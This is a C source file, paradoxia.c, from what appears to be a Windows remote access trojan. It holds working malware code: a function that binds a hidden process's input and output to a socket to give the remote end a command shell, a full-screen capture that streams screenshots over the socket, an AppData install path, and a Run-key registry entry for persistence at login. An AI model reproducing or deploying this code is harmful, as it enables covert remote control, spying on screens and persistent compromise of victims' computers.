/*
Author: Fahad (QuantumCore)
paradoxia.c (c) 2020
Created:  2020-08-15T15:27:04.427Z
Modified: -
*/

/*
Have a good time reading the source. You're an amazing person.
If you decide to copy, Don't forget to give me credit.
*/


#include "paradoxia.h"

// Awesome!

void TimeStamp(char buffer[100])
{
    time_t t = time(0);
    struct tm* now = localtime(&t);
    memset(buffer, '\0', 100);
    strftime(buffer, 100, "%Y-%m-%d-%S", now);
}

void ReportError(void)
{
    printf("Error : %ld\n", GetLastError());
}

void WSAReportError(void)
{
    printf("Error : %ld\n", WSAGetLastError());
}


void split(char* src, char* dest[5], const char* delimeter) {
    // Only split if delimeter does exist in the source string
    if (strstr(src, delimeter) != NULL)
    {
        int i = 0;
        char* p = strtok(src, delimeter);
        while (p != NULL)
        {
            dest[i++] = p;
            p = strtok(NULL, delimeter);
        }
    }
}

void ExecSock(SOCKET sockfd, char recvbuf[BUFFER])
{
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)sockfd;
    if (CreateProcess(NULL, (LPSTR)recvbuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)) {
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
    }
    else {
        sockprintf("Failed to Create Process, Error : %ld\n", GetLastError());
    }
}
DWORD ProcessId(LPCTSTR ProcessName)
{
    PROCESSENTRY32 pt;
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pt.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hsnap, &pt)) {
        do {
            if (!lstrcmpi(pt.szExeFile, ProcessName)) {
                CloseHandle(hsnap);
                return pt.th32ProcessID;
            }
        } while (Process32Next(hsnap, &pt));
    }
    CloseHandle(hsnap);
    return 0;
}

int CaptureAnImage(HWND hWnd, SOCKET sockfd)
{
    HDC hdcScreen;
    HDC hdcWindow;
    HDC hdcMemDC = NULL;
    HBITMAP hbmScreen = NULL;
    BITMAP bmpScreen;
    char buffer[100];
    // Retrieve the handle to a display device context for the client 
    // area of the window. 
    hdcScreen = GetDC(NULL);
    hdcWindow = GetDC(hWnd);

    // Create a compatible DC which is used in a BitBlt from the window DC
    hdcMemDC = CreateCompatibleDC(hdcWindow);

    if (!hdcMemDC)
    {
        sockprintf( "CreateCompatibleDC has failed Error %i", GetLastError());
        goto done;
    }

    // Get the client area for size calculation
    RECT rcClient;
    GetClientRect(hWnd, &rcClient);

    //This is the best stretch mode
    SetStretchBltMode(hdcWindow, HALFTONE);

    //The source DC is the entire screen and the destination DC is the current window (HWND)
    if (!StretchBlt(hdcWindow,
        0, 0,
        rcClient.right, rcClient.bottom,
        hdcScreen,
        0, 0,
        GetSystemMetrics(SM_CXSCREEN),
        GetSystemMetrics(SM_CYSCREEN),
        SRCCOPY))
    {
        sockprintf( "StretchBlt has failed Error %i", GetLastError());
        goto done;
    }

    // Create a compatible bitmap from the Window DC
    hbmScreen = CreateCompatibleBitmap(hdcWindow, rcClient.right - rcClient.left, rcClient.bottom - rcClient.top);

    if (!hbmScreen)
    {
        sockprintf( "CreateCompatibleBitmap Failed Error %i", GetLastError());
        goto done;
    }

    // Select the compatible bitmap into the compatible memory DC.
    SelectObject(hdcMemDC, hbmScreen);

    // Bit block transfer into our compatible memory DC.
    if (!BitBlt(hdcMemDC,
        0, 0,
        rcClient.right - rcClient.left, rcClient.bottom - rcClient.top,
        hdcWindow,
        0, 0,
        SRCCOPY))
    {
        sockprintf( "BitBlt has failed Error %i", GetLastError());
        goto done;
    }

    // Get the BITMAP from the HBITMAP
    GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);

    BITMAPFILEHEADER   bmfHeader;
    BITMAPINFOHEADER   bi;

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmpScreen.bmWidth;
    bi.biHeight = bmpScreen.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    DWORD dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;

    // Starting with 32-bit Windows, GlobalAlloc and LocalAlloc are implemented as wrapper functions that 
    // call HeapAlloc using a handle to the process's default heap. Therefore, GlobalAlloc and LocalAlloc 
    // have greater overhead than HeapAlloc.
    HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
    char* lpbitmap = (char*)GlobalLock(hDIB);

    // Gets the "bits" from the bitmap and copies them into a buffer 
    // which is pointed to by lpbitmap.
    GetDIBits(hdcWindow, hbmScreen, 0,
        (UINT)bmpScreen.bmHeight,
        lpbitmap,
        (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    // A file is created, this is where we will save the screen capture.
    /* HANDLE hFile = CreateFile(L"captureqwsx.bmp",
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, NULL);
        */
        // Add the size of the headers to the size of the bitmap to get the total file size
    DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    //Offset to where the actual bitmap bits start.
    bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);

    //Size of the file
    bmfHeader.bfSize = dwSizeofDIB;

    //bfType must always be BM for Bitmaps
    bmfHeader.bfType = 0x4D42; //BM   

    TimeStamp(buffer);
    sockprintf( "SCREENSHOT:%s.bmp:%i", buffer, sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize);
    Sleep(1000);
    DWORD dwBytesWritten = 0;
    WriteFile((HANDLE)sockfd, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
    WriteFile((HANDLE)sockfd, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
    WriteFile((HANDLE)sockfd, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

    //Unlock and Free the DIB from the heap
    GlobalUnlock(hDIB);
    GlobalFree(hDIB);

    //Close the handle for the file that was created
    // CloseHandle(hFile);

    //Clean up
done:
    if (hbmScreen) {
        DeleteObject(hbmScreen);
    }
    
    if (hdcMemDC) {
            DeleteObject(hdcMemDC);
    }
    
    ReleaseDC(NULL, hdcScreen);
    ReleaseDC(hWnd, hdcWindow);

    return 0;
}

char* appDataPath()
{
    static char szPath[MAX_PATH];
	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA | CSIDL_FLAG_CREATE, NULL, 0, szPath))){
		return szPath;
	} else {
	    return "C:\\Users\\Public"; // If We are unable to get the AppData/Romaing path, Use Public $HOME folder for installation
	}
}



void StartupKey(const char* czExePath)
{
	HKEY hKey;
	LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
								"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
								0 , KEY_WRITE,
								&hKey);
	if( ERROR_SUCCESS == lnRes )
	{   
		lnRes = RegSetValueEx(  hKey,
								INSTALL_FOLDER_NAME,
								0,
								REG_SZ,
								czExePath,
								strlen(czExePath));
	}

	RegCloseKey(hKey);
}
